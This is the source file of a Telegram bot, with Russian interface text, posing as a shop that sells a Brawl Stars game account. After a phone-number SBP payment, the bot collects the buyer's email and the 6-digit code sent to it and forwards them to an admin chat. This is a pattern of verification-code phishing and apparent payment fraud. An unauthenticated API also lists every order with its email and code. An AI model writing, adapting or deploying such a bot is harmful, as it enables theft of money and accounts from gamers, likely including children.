require('dotenv').config();
const { Telegraf, session, Markup } = require('telegraf');
const express = require('express');
const crypto = require('crypto');

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const orders = new Map();
const pendingEmailByChatId = new Map();

function generateOrderId() {
  return crypto.randomBytes(4).toString('hex').toUpperCase();
}

const ACCOUNTS = [
  {
    id: 'acc-29444',
    title: 'Brawl Stars — 29 444 кубка',
    trophies: 29444,
    fighters: 65,
    price: 800,
    year: 2024,
    imageUrl: 'https://i.ibb.co/qYT3zH2F/photo-2026-06-20-23-05-47.jpg',
  },
];

function getAccountById(id) {
  return ACCOUNTS.find(a => a.id === id) || null;
}

function formatPrice(price) {
  return new Intl.NumberFormat('ru-RU').format(price) + ' ₽';
}

// =====================
// ЭКРАНЫ (текст + кнопки)
// =====================

function screenCatalog(index) {
  const account = ACCOUNTS[index];
  const text =
    `🏆 *${account.title}*\n\n` +
    `🥇 Кубки: *${account.trophies.toLocaleString('ru-RU')}*\n` +
    `⚔️ Бойцы: *${account.fighters}*\n` +
    `📅 Год: *${account.year}*\n` +
    `💰 Цена: *${formatPrice(account.price)}*`;

  const navRow = [];
  if (index > 0) navRow.push(Markup.button.callback('◀ Назад', `catalog_${index - 1}`));
  if (index < ACCOUNTS.length - 1) navRow.push(Markup.button.callback('Вперёд ▶', `catalog_${index + 1}`));

  const rows = [];
  if (navRow.length > 0) rows.push(navRow);
  rows.push([Markup.button.callback(`🛒 Купить за ${formatPrice(account.price)}`, `buy_${account.id}`)]);

  return { text, keyboard: Markup.inlineKeyboard(rows) };
}

function screenPayment(account) {
  const text =
    `💳 *Оплата заказа*\n\n` +
    `🎮 Аккаунт: *${account.title}*\n` +
    `💰 Сумма: *${formatPrice(account.price)}*\n\n` +
    `📱 *Реквизиты СБП:*\n` +
    `📞 Номер: *+7 902 917\\-54\\-45*\n\n` +
    `После оплаты нажмите кнопку ниже 👇`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('✅ Я оплатил', `paid_${account.id}`)],
    [Markup.button.callback('◀ Назад к каталогу', 'back_catalog')],
  ]);

  return { text, keyboard };
}

function screenEnterName(account) {
  const text =
    `✍️ *Введите ваше имя*\n\n` +
    `Напишите ваше *полное имя и первую букву фамилии*\n` +
    `_Например: Александр К_\n\n` +
    `⚠️ *ВАЖНО:* Укажите имя точно так, как в банке при переводе. Если имя не совпадёт — оплата не будет подтверждена!\n\n` +
    `💰 Сумма перевода: *${formatPrice(account.price)}*\n` +
    `📞 На номер: *+7 902 917\\-54\\-45*`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('◀ Назад', `back_payment_${account.id}`)],
  ]);

  return { text, keyboard };
}

function screenWaiting(orderId, buyerName) {
  const text =
    `⏳ *Ожидайте подтверждения*\n\n` +
    `Заказ: *#${orderId}*\n` +
    `Имя: *${buyerName}*\n\n` +
    `Продавец проверяет ваш перевод по имени.\n` +
    `Как только оплата будет подтверждена — бот сообщит вам.`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('◀ Отменить и вернуться', `cancel_${orderId}`)],
  ]);

  return { text, keyboard };
}

function screenEnterEmail(orderId) {
  const text =
    `🎉 *Оплата подтверждена!*\n\n` +
    `Заказ: *#${orderId}*\n\n` +
    `Напишите ваш *email* прямо сюда в чат:\n` +
    `_Например: example@mail.ru_\n\n` +
    `На него придут детали заказа.`;

  // Кнопок нет — ждём ввода текста
  return { text, keyboard: Markup.inlineKeyboard([]) };
}

function screenEnterCode(orderId, email) {
  const text =
    `📬 *Проверьте почту!*\n\n` +
    `На адрес *${email}* должно было прийти письмо с кодом.\n\n` +
    `Найдите письмо и введите *6\\-значный код* прямо сюда в чат:`;

  return { text, keyboard: Markup.inlineKeyboard([]) };
}

function screenSuccess(accountTitle) {
  const text =
    `🎉 *Поздравляем! Заказ завершён!*\n\n` +
    `🏆 Аккаунт *${accountTitle}* передан вам\\.\n\n` +
    `Спасибо за покупку\\!\n` +
    `По вопросам: @brawlhelpp`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🏠 На главную', 'back_catalog')],
  ]);

  return { text, keyboard };
}

function screenRejected() {
  const text =
    `❌ *Заказ отклонён*\n\n` +
    `Оплата не найдена или имя не совпало\\.\n` +
    `Если вы уже перевели деньги — напишите: @brawlhelpp`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('◀ Вернуться в каталог', 'back_catalog')],
  ]);

  return { text, keyboard };
}

// =====================
// HELPERS: редактировать главное сообщение
// =====================
async function editMainMessage(ctx, screen) {
  const { text, keyboard } = screen;
  const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;
  const msgId = ctx.session?.mainMsgId;

  if (msgId) {
    try {
      await bot.telegram.editMessageText(chatId, msgId, null, text, {
        parse_mode: 'MarkdownV2',
        reply_markup: keyboard.reply_markup,
      });
      return;
    } catch (e) {
      // Сообщение не изменилось или удалено — отправим новое
    }
  }

  // Отправить новое главное сообщение
  const sent = await bot.telegram.sendMessage(chatId, text, {
    parse_mode: 'MarkdownV2',
    reply_markup: keyboard.reply_markup,
  });
  ctx.session.mainMsgId = sent.message_id;
}

async function editMainMessageByChatId(chatId, session, screen) {
  const { text, keyboard } = screen;
  const msgId = session?.mainMsgId;

  if (msgId) {
    try {
      await bot.telegram.editMessageText(chatId, msgId, null, text, {
        parse_mode: 'MarkdownV2',
        reply_markup: keyboard.reply_markup,
      });
      return;
    } catch (e) {}
  }

  const sent = await bot.telegram.sendMessage(chatId, text, {
    parse_mode: 'MarkdownV2',
    reply_markup: keyboard.reply_markup,
  });
  if (session) session.mainMsgId = sent.message_id;
}

// =====================
// СТАРТ
// =====================
bot.start(async (ctx) => {
  ctx.session = {};
  await ctx.reply(
    '👋 Привет\\! Это магазин аккаунтов Brawl Stars\\.\n\nВыбери действие:',
    {
      parse_mode: 'MarkdownV2',
      ...Markup.keyboard([
        ['📋 Каталог аккаунтов'],
        ['❓ Помощь'],
      ]).resize(),
    }
  );
});

// =====================
// КАТАЛОГ (кнопка меню)
// =====================
bot.hears('📋 Каталог аккаунтов', async (ctx) => {
  ctx.session = ctx.session || {};
  ctx.session.step = 'catalog';
  ctx.session.catalogIndex = 0;

  const screen = screenCatalog(0);
  const chatId = ctx.chat.id;
  const msgId = ctx.session.mainMsgId;

  if (msgId) {
    try {
      await bot.telegram.editMessageText(chatId, msgId, null, screen.text, {
        parse_mode: 'MarkdownV2',
        reply_markup: screen.keyboard.reply_markup,
      });
      return;
    } catch (e) {}
  }

  const sent = await ctx.reply(screen.text, {
    parse_mode: 'MarkdownV2',
    reply_markup: screen.keyboard.reply_markup,
  });
  ctx.session.mainMsgId = sent.message_id;
});

// =====================
// НАВИГАЦИЯ ПО КАТАЛОГУ
// =====================
bot.action(/^catalog_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1], 10);
  if (index < 0 || index >= ACCOUNTS.length) return ctx.answerCbQuery();
  ctx.session = ctx.session || {};
  ctx.session.catalogIndex = index;
  ctx.session.step = 'catalog';
  await ctx.answerCbQuery();
  await editMainMessage(ctx, screenCatalog(index));
});

// =====================
// НАЗАД В КАТАЛОГ
// =====================
bot.action('back_catalog', async (ctx) => {
  ctx.session = ctx.session || {};
  const index = ctx.session.catalogIndex || 0;
  ctx.session.step = 'catalog';
  await ctx.answerCbQuery();
  await editMainMessage(ctx, screenCatalog(index));
});

// =====================
// КУПИТЬ → экран оплаты
// =====================
bot.action(/^buy_(.+)$/, async (ctx) => {
  const accountId = ctx.match[1];
  const account = getAccountById(accountId);
  if (!account) return ctx.answerCbQuery('Аккаунт не найден');

  ctx.session = ctx.session || {};
  ctx.session.selectedAccountId = account.id;
  ctx.session.step = 'payment';

  await ctx.answerCbQuery();
  await editMainMessage(ctx, screenPayment(account));
});

// =====================
// НАЗАД К ОПЛАТЕ
// =====================
bot.action(/^back_payment_(.+)$/, async (ctx) => {
  const accountId = ctx.match[1];
  const account = getAccountById(accountId);
  if (!account) return ctx.answerCbQuery();

  ctx.session = ctx.session || {};
  ctx.session.step = 'payment';

  await ctx.answerCbQuery();
  await editMainMessage(ctx, screenPayment(account));
});

// =====================
// Я ОПЛАТИЛ → экран ввода имени
// =====================
bot.action(/^paid_(.+)$/, async (ctx) => {
  const accountId = ctx.match[1];
  const account = getAccountById(accountId);
  if (!account) return ctx.answerCbQuery('Аккаунт не найден');

  ctx.session = ctx.session || {};
  ctx.session.selectedAccountId = account.id;
  ctx.session.step = 'awaiting_name';

  await ctx.answerCbQuery();
  await editMainMessage(ctx, screenEnterName(account));
});

// =====================
// ОТМЕНА ЗАКАЗА
// =====================
bot.action(/^cancel_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);

  ctx.session = ctx.session || {};
  const index = ctx.session.catalogIndex || 0;
  ctx.session.step = 'catalog';

  if (order && order.status === 'pending') {
    order.status = 'cancelled';
    orders.set(orderId, order);
  }

  await ctx.answerCbQuery('Заказ отменён');
  await editMainMessage(ctx, screenCatalog(index));
});

// =====================
// MIDDLEWARE: восстановить step если ждём email
// =====================
bot.use(async (ctx, next) => {
  if (ctx.message?.text) {
    ctx.session = ctx.session || {};
    const chatId = String(ctx.chat?.id);
    const pendingOrderId = pendingEmailByChatId.get(chatId);
    if (pendingOrderId && ctx.session.step !== 'awaiting_email') {
      ctx.session.step = 'awaiting_email';
      ctx.session.orderId = pendingOrderId;
      pendingEmailByChatId.delete(chatId);
    }
  }
  return next();
});

// =====================
// ОБРАБОТКА ТЕКСТА
// =====================
bot.on('text', async (ctx) => {
  ctx.session = ctx.session || {};
  const text = ctx.message.text.trim();
  const step = ctx.session.step;

  // Удалить сообщение пользователя чтобы не засорять чат
  try { await ctx.deleteMessage(); } catch (e) {}

  if (text === '❓ Помощь') {
    try {
      const sent = await ctx.reply(
        '📞 По вопросам: @brawlhelpp\n\n' +
        'Как это работает:\n' +
        '1️⃣ Каталог → выберите аккаунт\n' +
        '2️⃣ Оплатите через СБП\n' +
        '3️⃣ Нажмите "Я оплатил"\n' +
        '4️⃣ Введите имя как в банке\n' +
        '5️⃣ Дождитесь подтверждения\n' +
        '6️⃣ Введите email\n' +
        '7️⃣ Проверьте почту, введите код\n' +
        '8️⃣ Готово! 🏆'
      );
      setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sent.message_id).catch(() => {}), 8000);
    } catch (e) {}
    return;
  }
  if (text === '📋 Каталог аккаунтов') return;

  // ШАГ: ввод имени
  if (step === 'awaiting_name') {
    if (text.length < 3) {
      const warn = await ctx.reply('❌ Введите полное имя и первую букву фамилии.\nНапример: Александр К');
      setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, warn.message_id).catch(() => {}), 4000);
      return;
    }

    const account = getAccountById(ctx.session.selectedAccountId);
    if (!account) {
      ctx.session.step = 'catalog';
      return editMainMessage(ctx, screenCatalog(ctx.session.catalogIndex || 0));
    }

    ctx.session.buyerName = text;
    ctx.session.step = 'awaiting_admin_confirm';

    const orderId = generateOrderId();
    const order = {
      orderId,
      buyerName: text,
      email: null,
      accountId: account.id,
      accountTitle: account.title,
      price: account.price,
      status: 'pending',
      code: null,
      chatId: String(ctx.chat.id),
      createdAt: new Date().toISOString(),
    };
    orders.set(orderId, order);
    ctx.session.orderId = orderId;

    await editMainMessage(ctx, screenWaiting(orderId, text));

    if (ADMIN_CHAT_ID) {
      try {
        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `🆕 *Новый заказ \\#${orderId}*\n\n` +
          `👤 Имя: *${escapeMarkdown(text)}*\n` +
          `🎮 Аккаунт: ${escapeMarkdown(account.title)}\n` +
          `🏆 Кубки: ${account.trophies.toLocaleString('ru-RU')}\n` +
          `💰 Цена: ${formatPrice(account.price)}\n\n` +
          `🔍 Проверьте перевод по имени:`,
          {
            parse_mode: 'MarkdownV2',
            reply_markup: {
              inline_keyboard: [[
                { text: '✅ Подтвердить', callback_data: `fulfill_${orderId}` },
                { text: '❌ Отклонить', callback_data: `reject_${orderId}` },
              ]],
            },
          }
        );
      } catch (e) {
        console.warn('Cannot notify admin:', e.message);
      }
    }
    return;
  }

  // ШАГ: ожидание подтверждения
  if (step === 'awaiting_admin_confirm') {
    const warn = await ctx.reply('⏳ Ваш заказ на проверке. Дождитесь подтверждения.');
    setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, warn.message_id).catch(() => {}), 4000);
    return;
  }

  // ШАГ: ввод email
  if (step === 'awaiting_email') {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(text)) {
      const warn = await ctx.reply('❌ Неверный формат email. Например: example@mail.ru');
      setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, warn.message_id).catch(() => {}), 4000);
      return;
    }

    const orderId = ctx.session.orderId;
    const order = orders.get(orderId);
    if (!order) {
      ctx.session.step = 'catalog';
      return editMainMessage(ctx, screenCatalog(ctx.session.catalogIndex || 0));
    }

    order.email = text;
    orders.set(orderId, order);
    ctx.session.email = text;
    ctx.session.step = 'awaiting_code_from_email';

    await editMainMessage(ctx, screenEnterCode(orderId, text));

    if (ADMIN_CHAT_ID) {
      try {
        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `📧 *Заказ \\#${orderId}* — покупатель указал email:\n\n` +
          `👤 Имя: ${escapeMarkdown(order.buyerName)}\n` +
          `📧 Email: *${escapeMarkdown(text)}*\n\n` +
          `Нажмите кнопку чтобы попросить покупателя прислать код из письма:`,
          {
            parse_mode: 'MarkdownV2',
            reply_markup: {
              inline_keyboard: [[
                { text: '📨 Запросить код у покупателя', callback_data: `askcode_${orderId}` },
              ]],
            },
          }
        );
      } catch (e) {
        console.warn('Cannot notify admin:', e.message);
      }
    }
    return;
  }

  // ШАГ: ввод кода из письма
  if (step === 'awaiting_code_from_email') {
    const codeRegex = /^\d{6}$/;
    if (!codeRegex.test(text)) {
      const warn = await ctx.reply('❌ Код должен состоять из 6 цифр. Проверьте письмо и попробуйте ещё раз.');
      setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, warn.message_id).catch(() => {}), 4000);
      return;
    }

    const orderId = ctx.session.orderId;
    const order = orders.get(orderId);
    if (!order) {
      ctx.session.step = 'catalog';
      return editMainMessage(ctx, screenCatalog(ctx.session.catalogIndex || 0));
    }

    order.code = text;
    order.status = 'code_received';
    orders.set(orderId, order);
    ctx.session.step = 'awaiting_final_confirm';

    const waitText =
      `⏳ *Код принят\\!*\n\n` +
      `Продавец проверяет код и завершает передачу аккаунта\\.\n` +
      `Пожалуйста, подождите\\.\\.\\.`;

    await editMainMessageByChatId(ctx.chat.id, ctx.session, {
      text: waitText,
      keyboard: Markup.inlineKeyboard([]),
    });

    if (ADMIN_CHAT_ID) {
      try {
        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `🔑 *Заказ \\#${orderId}* — покупатель прислал код:\n\n` +
          `👤 Имя: ${escapeMarkdown(order.buyerName)}\n` +
          `📧 Email: ${escapeMarkdown(order.email)}\n` +
          `🔑 Код: *${escapeMarkdown(text)}*\n\n` +
          `Проверьте код и завершите заказ:`,
          {
            parse_mode: 'MarkdownV2',
            reply_markup: {
              inline_keyboard: [[
                { text: '✅ Завершить заказ', callback_data: `complete_${orderId}` },
                { text: '❌ Отклонить', callback_data: `reject_${orderId}` },
              ]],
            },
          }
        );
      } catch (e) {
        console.warn('Cannot notify admin:', e.message);
      }
    }
    return;
  }

  if (step === 'awaiting_final_confirm') {
    const warn = await ctx.reply('⏳ Продавец проверяет код. Совсем скоро!');
    setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, warn.message_id).catch(() => {}), 4000);
    return;
  }
});

// =====================
// КНОПКИ АДМИНА
// =====================
bot.action(/^fulfill_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (!order) return ctx.answerCbQuery('❌ Заказ не найден');
  if (order.status !== 'pending') return ctx.answerCbQuery('⚠️ Уже обработан');

  order.status = 'confirmed';
  orders.set(orderId, order);

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('✅ Подтверждено!');
  await ctx.reply(`✅ Заказ #${orderId} подтверждён. Ожидаю email от покупателя...`);

  pendingEmailByChatId.set(String(order.chatId), orderId);

  // Найти сессию покупателя и обновить экран
  const chatId = Number(order.chatId);
  try {
    // Получим сессию через временный способ — отправим новый экран
    const sessionKey = `${chatId}:${chatId}`;
    await bot.telegram.sendMessage(chatId,
      `🎉 *Оплата подтверждена\\!*\n\n` +
      `Заказ: *\\#${orderId}*\n\n` +
      `Напишите ваш *email* прямо сюда в чат:\n` +
      `_Например: example@mail\\.ru_`,
      { parse_mode: 'MarkdownV2' }
    );
  } catch (e) {
    console.warn('Cannot notify buyer:', e.message);
  }
});

bot.action(/^askcode_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (!order) return ctx.answerCbQuery('❌ Заказ не найден');

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('📨 Запрос отправлен');
  await ctx.reply(`📨 Покупатель получил запрос кода для заказа #${orderId}`);

  if (order.chatId) {
    try {
      await bot.telegram.sendMessage(
        order.chatId,
        `📬 *Проверьте почту\\!*\n\n` +
        `На адрес *${escapeMarkdown(order.email)}* пришло письмо с кодом\\.\n\n` +
        `Введите *6\\-значный код* прямо сюда в чат:`,
        { parse_mode: 'MarkdownV2' }
      );
    } catch (e) {}
  }
});

bot.action(/^complete_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (!order) return ctx.answerCbQuery('❌ Заказ не найден');

  order.status = 'fulfilled';
  orders.set(orderId, order);

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('✅ Завершено!');
  await ctx.reply(
    `🏆 Заказ #${orderId} завершён!\n` +
    `👤 ${order.buyerName} | 📧 ${order.email} | 🔑 ${order.code}`
  );

  if (order.chatId) {
    try {
      await bot.telegram.sendMessage(
        order.chatId,
        `🎉 *Поздравляем\\! Заказ завершён\\!*\n\n` +
        `🏆 Аккаунт *${escapeMarkdown(order.accountTitle)}* передан вам\\.\n\n` +
        `Спасибо за покупку\\! По вопросам: @brawlhelpp`,
        { parse_mode: 'MarkdownV2' }
      );
    } catch (e) {}
  }
});

bot.action(/^reject_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (!order) return ctx.answerCbQuery('❌ Заказ не найден');
  if (order.status === 'fulfilled') return ctx.answerCbQuery('⚠️ Уже завершён');

  order.status = 'rejected';
  orders.set(orderId, order);

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('❌ Отклонено');
  await ctx.reply(`❌ Заказ #${orderId} отклонён.`);

  if (order.chatId) {
    try {
      await bot.telegram.sendMessage(
        order.chatId,
        `❌ *Заказ \\#${orderId} отклонён\\.*\n\nЕсли уже перевели — напишите: @brawlhelpp`,
        { parse_mode: 'MarkdownV2' }
      );
    } catch (e) {}
  }
});

// =====================
// ESCAPE для MarkdownV2
// =====================
function escapeMarkdown(text) {
  return String(text).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

// =====================
// EXPRESS + API
// =====================
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.get('/', (req, res) => res.json({ ok: true, message: 'Bot is running' }));

app.get('/api/orders', (req, res) => {
  const list = Array.from(orders.values()).sort(
    (a, b) => new Date(b.createdAt) - new Date(a.createdAt)
  );
  res.json({ orders: list });
});

app.get('/api/order/:id', (req, res) => {
  const order = orders.get(req.params.id);
  if (!order) return res.status(404).json({ error: 'Order not found' });
  res.json({
    orderId: order.orderId,
    status: order.status,
    code: order.status === 'fulfilled' ? order.code : null,
    accountTitle: order.accountTitle,
    price: order.price,
    createdAt: order.createdAt,
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));

bot.launch();
console.log('✅ Bot started');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
